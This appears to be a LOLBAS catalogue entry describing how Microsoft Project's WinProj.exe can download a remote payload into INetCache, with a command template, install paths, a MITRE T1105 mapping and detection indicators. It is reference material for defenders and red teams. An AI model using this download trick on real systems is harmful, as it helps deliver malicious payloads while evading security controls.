---
Acknowledgement:
- Person: Avihay El
Author: Avihay Eldad
Commands:
- Category: Download
  Command: WinProj.exe {REMOTEURL}
  Description: Downloads payload from remote server
  MitreID: T1105
  OperatingSystem: Windows
  Privileges: User
  Tags:
  - Download: INetCache
  Usecase: It will download a remote payload and place it in INetCache.
Created: 2024-02-14
Description: Microsoft Project Executable
Detection:
- IOC: URL on a WinProj command line
- IOC: WinProj making unexpected network connections or DNS requests
Full_Path:
- Path: C:\Program Files (x86)\Microsoft Office\Office14\WinProj.exe
- Path: C:\Program Files\Microsoft Office\Office14\WinProj.exe
- Path: C:\Program Files (x86)\Microsoft Office\Office15\WinProj.exe
- Path: C:\Program Files\Microsoft Office\Office15\WinProj.exe
- Path: C:\Program Files (x86)\Microsoft Office\Office16\WinProj.exe
- Path: C:\Program Files\Microsoft Office\Office16\WinProj.exe
- Path: C:\Program Files (x86)\Microsoft Office\root\Office14\WinProj.exe
- Path: C:\Program Files\Microsoft Office\root\Office14\WinProj.exe
- Path: C:\Program Files (x86)\Microsoft Office\root\Office15\WinProj.exe
- Path: C:\Program Files\Microsoft Office\root\Office15\WinProj.exe
- Path: C:\Program Files (x86)\Microsoft Office\root\Office16\WinProj.exe
- Path: C:\Program Files\Microsoft Office\root\Office16\WinProj.exe
Name: WinProj.exe
mitre_data:
  technique_ids:
  - T1105
tags:
- lolbas/othermsbinaries
---

# WinProj.exe

Microsoft Project Executable

# Path(s)

- `C:\Program Files (x86)\Microsoft Office\Office14\WinProj.exe`
- `C:\Program Files\Microsoft Office\Office14\WinProj.exe`
- `C:\Program Files (x86)\Microsoft Office\Office15\WinProj.exe`
- `C:\Program Files\Microsoft Office\Office15\WinProj.exe`
- `C:\Program Files (x86)\Microsoft Office\Office16\WinProj.exe`
- `C:\Program Files\Microsoft Office\Office16\WinProj.exe`
- `C:\Program Files (x86)\Microsoft Office\root\Office14\WinProj.exe`
- `C:\Program Files\Microsoft Office\root\Office14\WinProj.exe`
- `C:\Program Files (x86)\Microsoft Office\root\Office15\WinProj.exe`
- `C:\Program Files\Microsoft Office\root\Office15\WinProj.exe`
- `C:\Program Files (x86)\Microsoft Office\root\Office16\WinProj.exe`
- `C:\Program Files\Microsoft Office\root\Office16\WinProj.exe`

# Download Commands

Downloads payload from remote server

```batch
WinProj.exe {REMOTEURL}
```

- **Usecase:** It will download a remote payload and place it in INetCache.
- **Privileges Required:** User
- **MitreID:** `T1105`
- **Operating System(s):** Windows


# Acknowledgements

- Avihay Eldad (Authored, 2024-02-14)
- Avihay El